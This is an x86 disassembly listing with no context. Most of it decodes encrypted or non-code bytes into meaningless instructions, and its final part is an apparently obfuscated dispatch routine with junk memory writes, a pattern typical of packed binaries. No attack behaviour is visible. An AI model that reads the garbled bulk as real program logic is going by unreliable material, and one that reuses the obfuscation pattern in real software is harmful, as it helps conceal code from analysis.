  41d9de:	and    DWORD PTR [esp+ecx*8-0x1e7f69bf],ecx
  41d9e5:	or     edx,DWORD PTR [edi+0x74]
  41d9e8:	mov    esi,0x868a4f3d
  41d9ed:	in     al,0x17
  41d9ef:	adc    ebp,DWORD PTR [edx-0x7]
  41d9f2:	mov    edx,0x5dba0326
  41d9f7:	nop
  41d9f8:	loop   0x41d991
  41d9fa:	(bad)  
  41d9fb:	loop   0x41da5c
  41d9fd:	xor    DWORD PTR [esp+ebp*8+0x2e6b00d5],esi
  41da04:	fmul   DWORD PTR [ebx]
  41da06:	(bad)  
  41da07:	push   ds
  41da08:	cdq    
  41da09:	cmp    eax,0xb169ab4d
  41da0e:	add    ebp,DWORD PTR [edi+0x1d]
  41da11:	loope  0x41d9bf
  41da13:	and    edx,ebx
  41da15:	jo     0x41da40
  41da17:	adc    ebp,DWORD PTR [eax-0x40]
  41da1a:	and    eax,0x3a4fd92f
  41da1f:	addr16 repnz test al,0xec
  41da23:	pop    ds
  41da24:	pop    edi
  41da25:	adc    al,0xb9
  41da27:	das    
  41da28:	into   
  41da29:	adc    eax,0x246f47fa
  41da2e:	push   eax
  41da30:	xchg   edi,eax
  41da31:	xchg   ch,al
  41da33:	int3   
  41da34:	mov    edi,0xf9bf44bf
  41da39:	xchg   ecx,eax
  41da3a:	test   BYTE PTR [ebp-0x32],bl
  41da3d:	dec    edi
  41da3e:	cs push edx
  41da40:	dec    edi
  41da41:	aam    0xfa
  41da43:	(bad)  [edi-0x713ab63a]
  41da49:	xchg   esp,eax
  41da4a:	add    ecx,DWORD PTR [edi+0x7b5a0d93]
  41da50:	loop   0x41da75
  41da52:	inc    edi
  41da53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da54:	jo     0x41da07
  41da56:	xlat   BYTE PTR ds:[ebx]
  41da57:	mov    ah,0x7c
  41da59:	lea    ebx,[eax+0x38]
  41da5c:	pop    ebx
  41da5d:	(bad)  
  41da5e:	jle    0x41dac9
  41da60:	add    ebp,DWORD PTR [edx+0x244be33e]
  41da66:	ror    BYTE PTR [ecx],cl
  41da68:	in     eax,dx
  41da69:	into   
  41da6a:	push   ebp
  41da6b:	and    ebx,DWORD PTR [edx]
  41da6d:	fcomip st,st(4)
  41da6f:	push   ds
  41da70:	in     eax,dx
  41da71:	leave  
  41da72:	loope  0x41da71
  41da74:	dec    eax
  41da75:	and    BYTE PTR [esi-0x2c35ed3f],bl
  41da7b:	lock add BYTE PTR [ebx-0x6a],0x6
  41da80:	(bad)  
  41da81:	in     eax,0x76
  41da83:	in     al,dx
  41da84:	cdq    
  41da85:	mov    ebp,0x9c170572
  41da8a:	xchg   esp,eax
  41da8b:	fimul  DWORD PTR ds:0xe2b46142
  41da91:	xor    al,0x3c
  41da93:	fmulp  st(6),st
  41da95:	jno    0x41daed
  41da97:	cmp    al,0x17
  41da99:	aaa    
  41da9a:	jns    0x41daa6
  41da9c:	cmc    
  41da9d:	cdq    
  41da9e:	cdq    
  41da9f:	jg     0x41da24
  41daa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41daa2:	rcl    BYTE PTR [esp+ecx*8+0x48d68d2e],cl
  41daa9:	and    edx,ecx
  41daab:	jo     0x41db2a
  41daad:	in     al,dx
  41daae:	or     DWORD PTR [ebx+0x305bc9d2],esi
  41dab4:	mov    bh,0xa7
  41dab6:	sub    DWORD PTR [edx],ebx
  41dab8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dab9:	cmp    al,0x71
  41dabb:	mov    al,0x2d
  41dabd:	test   al,0x94
  41dabf:	mov    dl,0xbd
  41dac1:	das    
  41dac2:	repnz dec eax
  41dac4:	adc    edi,edi
  41dac6:	push   0xf8bc1db
  41dacb:	adc    BYTE PTR ds:0x3152f7dc,cl
  41dad1:	ins    DWORD PTR es:[edi],dx
  41dad2:	add    al,0x22
  41dad4:	lds    esp,FWORD PTR [edi+0x3e]
  41dad7:	mov    eax,ds:0x60405624
  41dadc:	sbb    ebx,DWORD PTR [ebx-0xfad7569]
  41dae2:	sub    eax,0xf83a22f4
  41dae7:	add    al,0x60
  41dae9:	dec    edx
  41daea:	dec    eax
  41daeb:	pop    es
  41daec:	pop    eax
  41daed:	lahf   
  41daee:	xchg   edi,eax
  41daef:	jno    0x41dab0
  41daf1:	inc    esi
  41daf2:	ret    0x1df6
  41daf5:	xor    ebp,ebx
  41daf7:	pop    ebp
  41daf8:	xchg   esi,eax
  41daf9:	in     eax,dx
  41dafa:	dec    esi
  41dafb:	xchg   esp,eax
  41dafc:	lahf   
  41dafd:	fldcw  WORD PTR [ebx]
  41daff:	mov    ebp,0x252ca765
  41db04:	mov    BYTE PTR [ecx-0xc],al
  41db07:	push   0xfffffff3
  41db09:	sbb    BYTE PTR [edi-0x9890c51],0x72
  41db10:	inc    eax
  41db11:	cdq    
  41db12:	push   ss
  41db13:	sub    dl,cl
  41db15:	pop    edx
  41db16:	and    BYTE PTR [ebp-0x4a93ee0d],al
  41db1c:	out    0x97,eax
  41db1e:	xor    ebx,esp
  41db20:	std    
  41db21:	xchg   esp,eax
  41db22:	mov    dl,0x34
  41db24:	adc    al,BYTE PTR [edx+edx*1-0x57699837]
  41db2b:	out    dx,al
  41db2c:	in     eax,dx
  41db2d:	pop    ds
  41db2e:	ret    0x4224
  41db31:	xchg   ebp,eax
  41db32:	and    esp,DWORD PTR [ebp+0x18]
  41db35:	hlt    
  41db36:	mov    ah,0x69
  41db38:	test   BYTE PTR [ebp+0x501bef3e],ch
  41db3e:	push   eax
  41db3f:	jae    0x41db4b
  41db41:	in     eax,0xfb
  41db43:	gs inc ebx
  41db45:	mov    ebp,0x7c15f72f
  41db4a:	fidiv  WORD PTR [edx]
  41db4c:	call   FWORD PTR [ecx]
  41db4e:	int    0x56
  41db50:	in     al,dx
  41db51:	dec    ah
  41db53:	mov    bl,0x8c
  41db55:	fs xchg edx,eax
  41db57:	sahf   
  41db58:	fsub   st,st(4)
  41db5a:	or     DWORD PTR [eax],0xffffff91
  41db5d:	shl    BYTE PTR [eax-0x72],0x10
  41db61:	mov    ch,0x9b
  41db63:	adc    ebp,ebp
  41db65:	repz mov dh,0x74
  41db68:	pop    ds
  41db69:	mov    al,0x15
  41db6b:	cmp    bh,BYTE PTR ds:0x25955e23
  41db71:	jnp    0x41db18
  41db73:	dec    ecx
  41db74:	lods   al,BYTE PTR ds:[esi]
  41db75:	push   esi
  41db76:	inc    ecx
  41db77:	and    ebx,DWORD PTR [ebx]
  41db79:	mov    ch,0xb4
  41db7b:	mov    dh,0xb8
  41db7d:	int    0x9a
  41db7f:	mov    dl,0x84
  41db81:	sub    edi,edi
  41db83:	lahf   
  41db84:	xchg   esi,eax
  41db85:	dec    ebx
  41db86:	or     al,BYTE PTR [ebp+0xca1c21c]
  41db8c:	jne    0x41dbb7
  41db8e:	mov    esp,0x84df4947
  41db93:	fidiv  WORD PTR [ebx-0x48]
  41db96:	rol    BYTE PTR [edi],1
  41db98:	push   0x19
  41db9a:	lods   al,BYTE PTR ds:[esi]
  41db9b:	ins    BYTE PTR es:[edi],dx
  41db9c:	push   es
  41db9d:	adc    esi,DWORD PTR ds:0xd8e9301f
  41dba3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dba4:	ds imul ebx,edi,0xc9d91c94
  41dbab:	pop    ecx
  41dbac:	fnstenv [eax-0x24]
  41dbaf:	popa   
  41dbb0:	jecxz  0x41dbba
  41dbb2:	xor    BYTE PTR ds:0xd7028fae,al
  41dbb8:	outs   dx,DWORD PTR ds:[esi]
  41dbb9:	mov    eax,0x2eb90141
  41dbbe:	loope  0x41db80
  41dbc0:	add    al,0x36
  41dbc2:	mov    eax,DWORD PTR [edi+0x28d29bc9]
  41dbc8:	and    edi,0x61
  41dbcb:	test   bh,0x6e
  41dbce:	fiadd  DWORD PTR [ebp+ebx*4+0x20]
  41dbd2:	lods   al,BYTE PTR ds:[esi]
  41dbd3:	popf   
  41dbd4:	loop   0x41db9c
  41dbd6:	mov    DWORD PTR [esi-0x332b168c],edx
  41dbdc:	stos   DWORD PTR es:[edi],eax
  41dbdd:	or     eax,0xc7a428bf
  41dbe2:	jmp    0xf26022e3
  41dbe7:	loopne 0x41dc53
  41dbe9:	cli    
  41dbea:	mov    ebx,0x4944de08
  41dbef:	in     al,0xf5
  41dbf1:	sbb    BYTE PTR [edi+0x528ec72b],bh
  41dbf7:	push   ds
  41dbf8:	mov    esi,0x81d68eae
  41dbfd:	fwait
  41dbfe:	and    ebp,esi
  41dc00:	sub    eax,0xda68959
  41dc05:	push   cs
  41dc06:	mov    ebx,0xbdae27fe
  41dc0b:	cdq    
  41dc0c:	and    edx,ebp
  41dc0e:	xor    BYTE PTR [eax+0x41e1d81c],0xa8
  41dc15:	test   DWORD PTR [eax],edx
  41dc17:	cmp    ebx,DWORD PTR cs:[ebp+0x7b]
  41dc1b:	stc    
  41dc1c:	dec    edx
  41dc1d:	ins    BYTE PTR es:[edi],dx
  41dc1e:	dec    edx
  41dc1f:	into   
  41dc20:	pop    eax
  41dc21:	rcl    BYTE PTR [eax+ecx*8],cl
  41dc24:	stos   DWORD PTR es:[edi],eax
  41dc25:	jne    0x41dc81
  41dc27:	into   
  41dc28:	je     0x41dbb2
  41dc2a:	in     al,dx
  41dc2b:	retf   
  41dc2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc2d:	(bad)  
  41dc2e:	jmp    0x41dc2b
  41dc30:	in     al,dx
  41dc31:	xchg   edx,eax
  41dc32:	lods   eax,DWORD PTR ds:[esi]
  41dc33:	lahf   
  41dc34:	shr    DWORD PTR [ebx+esi*4],cl
  41dc37:	call   0x745ba072
  41dc3c:	loopne 0x41dbe8
  41dc3e:	ficomp WORD PTR [ecx]
  41dc40:	test   al,0x23
  41dc42:	pop    edx
  41dc43:	cdq    
  41dc44:	mov    ebp,0x77a222bc
  41dc49:	sbb    eax,0x5613a608
  41dc4e:	inc    esi
  41dc4f:	jnp    0x41dbf8
  41dc51:	je     0x41dc91
  41dc53:	ror    DWORD PTR [edx+0x40],cl
  41dc56:	lods   al,BYTE PTR ds:[esi]
  41dc57:	enter  0xf9bb,0x83
  41dc5b:	loope  0x41dc53
  41dc5d:	fist   WORD PTR [esi]
  41dc5f:	lods   al,BYTE PTR ds:[esi]
  41dc60:	or     eax,0x72cc96e4
  41dc65:	or     DWORD PTR [ecx+0x63],ecx
  41dc68:	push   ebx
  41dc69:	pop    ebx
  41dc6a:	into   
  41dc6b:	xchg   edi,eax
  41dc6c:	cmp    edx,DWORD PTR [edx+0x41dffcee]
  41dc72:	sbb    al,0x56
  41dc74:	or     DWORD PTR [ebx-0x194d2e09],edi
  41dc7a:	call   0x4f57:0x93453da3
  41dc81:	push   es
  41dc82:	cmp    ecx,ebx
  41dc84:	xor    DWORD PTR ds:0xf90af910,esp
  41dc8a:	adc    BYTE PTR [ecx-0x64],ah
  41dc8d:	mov    ds:0x578c8c94,al
  41dc92:	and    DWORD PTR [ebx-0x80],esi
  41dc95:	dec    esi
  41dc96:	call   0x7009152
  41dc9b:	adc    eax,0xeacf11ae
  41dca0:	push   ebp
  41dca1:	in     al,dx
  41dca2:	dec    esi
  41dca3:	cld    
  41dca4:	jnp    0x41dc39
  41dca6:	fsubr  st,st(3)
  41dca8:	js     0x41dc44
  41dcaa:	mov    bl,BYTE PTR [eax-0x9]
  41dcad:	scas   eax,DWORD PTR es:[edi]
  41dcae:	or     al,0x91
  41dcb0:	xor    esp,0x8a56358b
  41dcb6:	mov    bl,BYTE PTR es:[esi+0x38e212e4]
  41dcbd:	push   esp
  41dcbe:	push   edi
  41dcbf:	popa   
  41dcc0:	push   esi
  41dcc1:	inc    ebx
  41dcc2:	push   0xffffffb9
  41dcc4:	adc    DWORD PTR [esi-0x7],edi
  41dcc7:	mov    edx,0x33afbf66
  41dccc:	js     0x41dc98
  41dcce:	cld    
  41dccf:	inc    ebx
  41dcd0:	shl    BYTE PTR [ebp-0x156674b9],0xa5
  41dcd7:	stos   DWORD PTR es:[edi],eax
  41dcd8:	sbb    eax,0x70b1a226
  41dcdd:	out    dx,al
  41dcde:	frstor [esi]
  41dce0:	call   0x390271a2
  41dce5:	mov    bh,0x20
  41dce7:	pop    ds
  41dce8:	shl    ebp,0x14
  41dceb:	xor    BYTE PTR [edi-0x12],al
  41dcee:	mov    dh,0xb9
  41dcf0:	jno    0x41dcd5
  41dcf2:	test   al,0x7c
  41dcf4:	inc    edi
  41dcf5:	aas    
  41dcf6:	sub    edx,DWORD PTR [edx-0x1f]
  41dcf9:	add    eax,0x9aab02b3
  41dcfe:	pop    ecx
  41dcff:	or     DWORD PTR [edx+0x67fc6757],esp
  41dd05:	test   ecx,esi
  41dd07:	(bad)  
  41dd08:	mov    al,ds:0x45df484d
  41dd0d:	into   
  41dd0e:	push   ss
  41dd0f:	test   bh,bh
  41dd11:	xlat   BYTE PTR ds:[ebx]
  41dd12:	mov    edx,0x19db822b
  41dd17:	lock sti 
  41dd19:	push   es
  41dd1a:	xchg   ebp,eax
  41dd1b:	ret    
  41dd1c:	cmc    
  41dd1d:	sbb    BYTE PTR [edi+0x3b],ah
  41dd20:	xor    ebp,edi
  41dd22:	out    dx,al
  41dd23:	dec    ebx
  41dd24:	xor    eax,0xa29033b9
  41dd29:	imul   esi,DWORD PTR [eax],0x6411c19d
  41dd2f:	shl    al,1
  41dd31:	xor    eax,0x17d2fc2c
  41dd36:	and    edi,ecx
  41dd38:	popf   
  41dd39:	lods   eax,DWORD PTR ds:[esi]
  41dd3a:	jmp    0xf090cf9f
  41dd3f:	popa   
  41dd40:	mov    bl,0x3
  41dd42:	ret    
  41dd43:	mov    ecx,DWORD PTR [ebx-0x54]
  41dd46:	mov    eax,ds:0xfc5c93d2
  41dd4b:	arpl   WORD PTR [ebp+0x73],di
  41dd4e:	(bad)  
  41dd4f:	sub    al,0x61
  41dd51:	les    edi,FWORD PTR [eax]
  41dd53:	xchg   ebp,eax
  41dd54:	mov    dl,0x4d
  41dd56:	add    DWORD PTR [ebx+0x59],ecx
  41dd59:	pop    ebp
  41dd5a:	mov    edx,DWORD PTR [edx+0x3e]
  41dd5d:	addr16 (bad) 
  41dd5f:	sbb    ah,cl
  41dd61:	lahf   
  41dd62:	jb     0x41dd8d
  41dd64:	out    dx,al
  41dd65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd66:	xchg   esi,eax
  41dd67:	sahf   
  41dd68:	adc    eax,0x62064281
  41dd6d:	or     dh,dh
  41dd6f:	dec    esi
  41dd70:	dec    edi
  41dd71:	mov    cl,0x9f
  41dd73:	dec    ebp
  41dd74:	retf   0x8f97
  41dd77:	call   0x5f27660c
  41dd7c:	fnstenv [edi+eax*4-0x4516aea7]
  41dd83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd84:	lahf   
  41dd85:	jmp    0x41dd07
  41dd87:	into   
  41dd88:	cmp    dl,BYTE PTR [ecx]
  41dd8a:	jbe    0x41dd92
  41dd8c:	sar    al,1
  41dd8e:	push   esi
  41dd8f:	dec    ecx
  41dd90:	mov    ch,0xda
  41dd92:	cmp    DWORD PTR [ebx],edx
  41dd94:	(bad)  
  41dd95:	xor    al,cl
  41dd97:	rcl    BYTE PTR [esi],1
  41dd99:	rcl    DWORD PTR [ecx],0x4d
  41dd9c:	dec    ebx
  41dd9d:	mov    ds:0x2ecfbc51,eax
  41dda2:	or     ch,BYTE PTR [edx+0xb]
  41dda5:	xor    al,0xd5
  41dda7:	mov    BYTE PTR [eax-0x22b18135],cl
  41ddad:	icebp  
  41ddae:	or     eax,0xd5a54013
  41ddb3:	and    ecx,DWORD PTR [edi+edi*4]
  41ddb6:	pop    ds
  41ddb7:	call   0xde17:0xc5a28796
  41ddbe:	fild   DWORD PTR [edi+esi*2]
  41ddc1:	gs jbe 0x41ddcc
  41ddc4:	jg     0x41dded
  41ddc6:	das    
  41ddc7:	inc    edx
  41ddc8:	jae    0x41dda2
  41ddca:	or     eax,ebx
  41ddcc:	sbb    DWORD PTR [ebx+0x63],0x65
  41ddd0:	fucom  st(2)
  41ddd2:	popa   
  41ddd3:	and    ah,bh
  41ddd5:	cdq    
  41ddd6:	ror    dh,0xc9
  41ddd9:	or     DWORD PTR [eax+0x6fbc5a74],ecx
  41dddf:	sbb    al,0xd5
  41dde1:	bound  ecx,QWORD PTR [edx+edx*8-0x52b37467]
  41dde8:	ficom  DWORD PTR [ebp+0x93c455c]
  41ddee:	test   DWORD PTR [ecx-0xa2efbaa],esi
  41ddf4:	(bad)  [eax-0x4c]
  41ddf7:	jmp    0x9a05:0xfc0cebd2
  41ddfe:	mov    DWORD PTR ds:0xa56b271c,ecx
  41de04:	cmp    BYTE PTR [ebx],ah
  41de06:	(bad)  
  41de07:	out    dx,al
  41de08:	ins    DWORD PTR es:[edi],dx
  41de09:	add    eax,DWORD PTR [eax+0x35d5fd36]
  41de0f:	xchg   edx,eax
  41de10:	mov    al,ds:0x1aaf70b4
  41de15:	or     bh,BYTE PTR [ebx]
  41de17:	xor    DWORD PTR [ecx+0x65],0xffffffdf
  41de1b:	sbb    ecx,DWORD PTR [edi]
  41de1d:	xlat   BYTE PTR ds:[ebx]
  41de1e:	add    edx,DWORD PTR [ebx-0x57]
  41de21:	inc    DWORD PTR [ebx-0x381d65e1]
  41de27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de28:	or     DWORD PTR [ecx],ecx
  41de2a:	dec    edx
  41de2b:	aad    0x94
  41de2d:	sbb    eax,0x2e48d50e
  41de32:	int    0x6a
  41de34:	pop    esi
  41de35:	and    BYTE PTR cs:[ebx+eiz*2+0x6f],ch
  41de3a:	and    eax,0x263f3469
  41de3f:	or     DWORD PTR [ecx+esi*2],ebx
  41de42:	adc    BYTE PTR [edx+0x70940022],al
  41de48:	mov    eax,0x541afd5e
  41de4d:	popa   
  41de4e:	cs inc ebx
  41de50:	inc    edi
  41de51:	ret    0xb39d
  41de54:	mov    eax,ds:0x3b3677dc
  41de59:	ds or  eax,0xcaa903e5
  41de5f:	mov    edi,gs
  41de61:	jo     0x41de32
  41de63:	fldcw  WORD PTR [eax-0x71]
  41de66:	mov    ebx,0xa4a826dc
  41de6b:	scas   al,BYTE PTR es:[edi]
  41de6c:	aas    
  41de6d:	and    DWORD PTR [ecx+esi*4-0x2c9c12b6],esp
  41de74:	push   0x17
  41de76:	std    
  41de77:	mov    ebp,ecx
  41de79:	cli    
  41de7a:	ins    DWORD PTR es:[edi],dx
  41de7b:	mov    cl,0xd2
  41de7d:	dec    ecx
  41de7e:	and    dl,cl
  41de80:	(bad)  
  41de81:	sbb    bl,BYTE PTR [esi-0x21d3593]
  41de87:	xor    al,0xf5
  41de89:	out    dx,al
  41de8a:	cmc    
  41de8b:	push   esp
  41de8c:	sbb    dl,BYTE PTR [edx]
  41de8e:	(bad)  
  41de8f:	daa    
  41de90:	adc    al,0x89
  41de92:	add    DWORD PTR [edi-0x94c902b],0xbd79299d
  41de9c:	aaa    
  41de9d:	mov    esp,0xef800c19
  41dea2:	jb     0x41dec2
  41dea4:	push   0x6e
  41dea6:	mov    ebp,DWORD PTR [edi]
  41dea8:	(bad)  
  41dea9:	adc    al,0x2d
  41deab:	mov    eax,ds:0xa63327db
  41deb0:	bound  esi,QWORD PTR [edx+0x4d]
  41deb3:	pushf  
  41deb4:	push   ebx
  41deb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41deb6:	faddp  st(5),st
  41deb8:	fild   QWORD PTR [ebp-0x77]
  41debb:	sti    
  41debc:	mov    gs,WORD PTR [ebx+0x77cabb15]
  41dec2:	leave  
  41dec3:	cmp    eax,0x8203192d
  41dec8:	neg    BYTE PTR [esi+0x7f45dac4]
  41dece:	xor    eax,0xb7f150a2
  41ded3:	adc    dl,BYTE PTR [ebx+ecx*2+0x785b94fc]
  41deda:	into   
  41dedb:	arpl   WORD PTR [edi+esi*2],bp
  41dede:	mov    edi,0xb0a94772
  41dee3:	push   0x41
  41dee5:	or     eax,0x1b7a417d
  41deea:	cmc    
  41deeb:	mov    edx,0x50ee2a04
  41def0:	icebp  
  41def1:	xchg   BYTE PTR [esi+0x6],ah
  41def4:	or     al,0x38
  41def6:	sbb    DWORD PTR [esi-0x31],eax
  41def9:	js     0x41debf
  41defb:	sbb    ah,BYTE PTR [ecx-0x71080034]
  41df01:	dec    ecx
  41df02:	mov    esi,0xd4589ac2
  41df07:	sub    al,0x4d
  41df09:	test   al,0x1c
  41df0b:	ret    
  41df0c:	mov    WORD PTR ds:0x67cf25d0,es
  41df12:	dec    ebp
  41df13:	into   
  41df14:	arpl   WORD PTR [ebx-0x21],di
  41df17:	pop    esi
  41df18:	lea    eax,[eax-0x24]
  41df1b:	mov    ebx,0x5a9a382
  41df20:	pop    edi
  41df21:	xor    bl,BYTE PTR [ecx+0x57]
  41df24:	ins    DWORD PTR es:[edi],dx
  41df25:	inc    esi
  41df26:	pop    edi
  41df27:	dec    edx
  41df28:	jae    0x41df86
  41df2a:	push   edi
  41df2b:	xchg   esp,eax
  41df2c:	test   dh,bh
  41df2e:	retf   0x2dab
  41df31:	mov    eax,ds:0xe4d97938
  41df36:	sbb    BYTE PTR [ecx],bh
  41df38:	repnz aas 
  41df3a:	jle    0x41df09
  41df3c:	mov    ch,0xed
  41df3e:	cmp    BYTE PTR [ebp-0x18],0x95
  41df42:	nop
  41df43:	pop    ds
  41df44:	pop    esi
  41df45:	mov    esp,0x459a1613
  41df4a:	mov    esi,0xe857ee2c
  41df4f:	adc    BYTE PTR [ecx+eiz*1-0x43c03467],dl
  41df56:	lods   eax,DWORD PTR ds:[esi]
  41df57:	lock xchg esi,eax
  41df59:	mov    ds,WORD PTR [ebx+0x24ae06dc]
  41df5f:	pop    es
  41df60:	add    eax,0xab6bc6ad
  41df65:	jmp    0x41dfcd
  41df67:	mov    cl,dh
  41df69:	mov    cl,0x5c
  41df6b:	dec    esp
  41df6c:	adc    cl,BYTE PTR [ebx+0x56]
  41df6f:	js     0x41dfb9
  41df71:	(bad)  
  41df72:	std    
  41df73:	push   ss
  41df74:	out    0xd0,eax
  41df76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df77:	(bad)
  41df7b:	cdq    
  41df7c:	inc    ebx
  41df7d:	add    DWORD PTR [esi],ebx
  41df7f:	sub    eax,0x7539ffa7
  41df84:	mov    eax,ds:0xb1397286
  41df89:	cwde   
  41df8a:	or     esp,DWORD PTR [esi+0x5f04146]
  41df90:	push   0x6831316
  41df95:	push   ds
  41df96:	mov    ebp,0xcedd2305
  41df9b:	popf   
  41df9c:	outs   dx,BYTE PTR ds:[esi]
  41df9d:	sub    al,0xf3
  41df9f:	ds out dx,al
  41dfa1:	call   0xcbd4:0x638c0c4
  41dfa8:	rol    al,1
  41dfaa:	sub    dl,BYTE PTR [ebx+0xcc02561]
  41dfb0:	js     0x41e006
  41dfb2:	aad    0x43
  41dfb4:	jl     0x41df4f
  41dfb6:	cmp    eax,0x41e2038
  41dfbb:	xchg   DWORD PTR [ecx+esi*1+0x58],edx
  41dfbf:	(bad)  
  41dfc0:	shl    BYTE PTR [edi],cl
  41dfc2:	ret    
  41dfc3:	in     al,0xf0
  41dfc5:	scas   al,BYTE PTR es:[edi]
  41dfc6:	imul   esp,DWORD PTR ds:0x405e49e1,0xa9747866
  41dfd0:	in     al,dx
  41dfd1:	xor    dl,ah
  41dfd3:	repnz neg BYTE PTR ds:0x4aab8ed8
  41dfda:	pop    edx
  41dfdb:	call   0xb2dda400
  41dfe0:	pop    ebx
  41dfe1:	pushf  
  41dfe2:	sbb    BYTE PTR [edi+0x42],ah
  41dfe5:	test   BYTE PTR [ebx-0x2296b687],ah
  41dfeb:	mov    dh,0x67
  41dfed:	cmp    eax,DWORD PTR [edx-0x27ac30d3]
  41dff3:	mov    dl,0xa5
  41dff5:	mov    cl,0xf7
  41dff7:	js     0x41dfd0
  41dff9:	jno    0x41e04d
  41dffb:	sub    DWORD PTR [ecx],eax
  41dffd:	jle    0x41e01a
  41dfff:	or     bl,dh
  41e001:	lods   al,BYTE PTR ds:[esi]
  41e002:	jb     0x41dfa5
  41e004:	pop    esi
  41e005:	(bad)  
  41e006:	lods   al,BYTE PTR ds:[esi]
  41e007:	sti    
  41e008:	out    dx,al
  41e009:	adc    ebx,0xa7cde181
  41e00f:	out    dx,eax
  41e010:	cmc    
  41e011:	pslld  mm3,mm4
  41e014:	push   esi
  41e015:	dec    edi
  41e016:	addr16 xchg edx,eax
  41e018:	and    eax,0xa06f141e
  41e01d:	sbb    al,0xbb
  41e01f:	or     BYTE PTR [edx],bl
  41e021:	scas   al,BYTE PTR es:[edi]
  41e022:	cld    
  41e023:	in     al,0x71
  41e025:	int3   
  41e026:	jno    0x41dfc3
  41e028:	or     bl,BYTE PTR [edx-0x263b5fe4]
  41e02e:	in     eax,dx
  41e02f:	outs   dx,DWORD PTR ds:[esi]
  41e030:	ins    BYTE PTR es:[edi],dx
  41e031:	adc    dl,0xe9
  41e034:	arpl   WORD PTR [eax-0x44],di
  41e037:	or     BYTE PTR [ecx-0x55fd573],cl
  41e03d:	jmp    0xfd7adc03
  41e042:	bound  ebx,QWORD PTR [eax-0x21]
  41e045:	retf   
  41e046:	mov    al,0x9d
  41e048:	in     al,0x24
  41e04a:	pop    esp
  41e04b:	add    BYTE PTR [edi+0x2480253e],ah
  41e051:	clc    
  41e052:	xor    dl,ah
  41e054:	arpl   WORD PTR [ecx-0x3],bp
  41e057:	and    eax,0x3bd9eeca
  41e05c:	pop    edi
  41e05d:	cli    
  41e05e:	jl     0x41dffa
  41e060:	aam    0xf9
  41e062:	mov    ecx,0x7da14e93
  41e067:	cmc    
  41e068:	push   ecx
  41e069:	fistp  DWORD PTR gs:[esi+0x16]
  41e06d:	or     edx,eax
  41e06f:	mov    ah,0xd
  41e071:	imul   esi,DWORD PTR [esi-0x5a],0xffffff9e
  41e075:	inc    esi
  41e076:	inc    ebx
  41e077:	xor    bh,BYTE PTR [ecx+0x8]
  41e07a:	jg     0x41e0f8
  41e07c:	rcr    BYTE PTR [esp+esi*1],cl
  41e07f:	mov    esp,0x82767fe5
  41e084:	push   0x882c2723
  41e089:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e08a:	ins    DWORD PTR es:[edi],dx
  41e08b:	loop   0x41e0d6
  41e08d:	mov    edi,0x404d03ef
  41e092:	outs   dx,BYTE PTR ds:[esi]
  41e093:	mov    al,0x8e
  41e095:	rcr    DWORD PTR [eax-0x7fb4db1f],cl
  41e09b:	addps  xmm0,XMMWORD PTR [ecx]
  41e09e:	pop    edi
  41e09f:	pop    ds
  41e0a0:	mov    al,ds:0xb8610ec4
  41e0a5:	mov    ah,0x85
  41e0a7:	rep lods al,BYTE PTR ds:[esi]
  41e0a9:	stos   DWORD PTR es:[edi],eax
  41e0aa:	in     al,0xca
  41e0ac:	jl     0x41e0d0
  41e0ae:	je     0x41e076
  41e0b0:	clc    
  41e0b1:	pop    ebx
  41e0b2:	mov    DWORD PTR [esi],ecx
  41e0b4:	aas    
  41e0b5:	mov    WORD PTR [edi+0x3d4425db],cs
  41e0bb:	xchg   ecx,eax
  41e0bc:	pop    ds
  41e0bd:	xchg   esp,eax
  41e0be:	jo     0x41e087
  41e0c0:	add    eax,0x432e3f
  41e0c5:	push   esp
  41e0c6:	adc    eax,DWORD PTR [eax]
  41e0c8:	add    BYTE PTR [edi],cl
  41e0ca:	test   DWORD PTR [ecx],esi
  41e0cc:	add    BYTE PTR [eax],al
  41e0ce:	add    BYTE PTR [ebx],bh
  41e0d0:	xrelease mov DWORD PTR ds:0x432e7b,0x261b
  41e0db:	jne    0x41e100
  41e0e1:	push   ebx
  41e0e2:	mov    DWORD PTR ds:0x432e67,0x2b68
  41e0ec:	push   0x70941f97
  41e0f1:	mov    DWORD PTR ds:0x432e63,0x40d9
  41e0fb:	jmp    0x420786
  41e100:	mov    eax,ds:0x432eb7
  41e105:	mov    eax,DWORD PTR [ebp+0x18]
  41e108:	mov    esi,DWORD PTR [ebp+0x1c]
  41e10b:	cmp    eax,0x70941f97
  41e110:	mov    DWORD PTR ds:0x432ebb,0x3db6
  41e11a:	jne    0x41e147
  41e120:	cmp    esi,ebx
  41e122:	mov    DWORD PTR ds:0x432e5f,0x2bd8
  41e12c:	jne    0x41e147
  41e132:	push   ebx
  41e133:	mov    DWORD PTR ds:0x432e2b,0x15b3
  41e13d:	push   0x70941f95
  41e142:	jmp    0x420786
  41e147:	mov    DWORD PTR ds:0x432e73,0x7017
  41e151:	mov    eax,DWORD PTR [ebp+0x18]
  41e154:	mov    esi,DWORD PTR [ebp+0x1c]
  41e157:	mov    DWORD PTR ds:0x432e27,0x78f9
  41e161:	cmp    eax,0x70941f95
  41e166:	jne    0x41e19d
  41e16c:	mov    DWORD PTR ds:0x432ecf,0x6494
  41e176:	cmp    esi,ebx
  41e178:	jne    0x41e19d
  41e17e:	push   ebx
  41e17f:	mov    DWORD PTR ds:0x432ea3,0x58e0
  41e189:	push   0x70941f9b
  41e18e:	mov    DWORD PTR ds:0x432e3f,0x40d6
  41e198:	jmp    0x420786
  41e19d:	mov    DWORD PTR ds:0x432e93,edx
  41e1a3:	mov    eax,DWORD PTR [ebp+0x18]
  41e1a6:	mov    esi,DWORD PTR [ebp+0x1c]
  41e1a9:	mov    DWORD PTR ds:0x432e83,0x6338
  41e1b3:	cmp    eax,0x70941f9b
  41e1b8:	mov    DWORD PTR ds:0x432e53,0x174c
  41e1c2:	jne    0x41e203
  41e1c8:	mov    DWORD PTR ds:0x432e67,0x61b3
  41e1d2:	cmp    esi,ebx
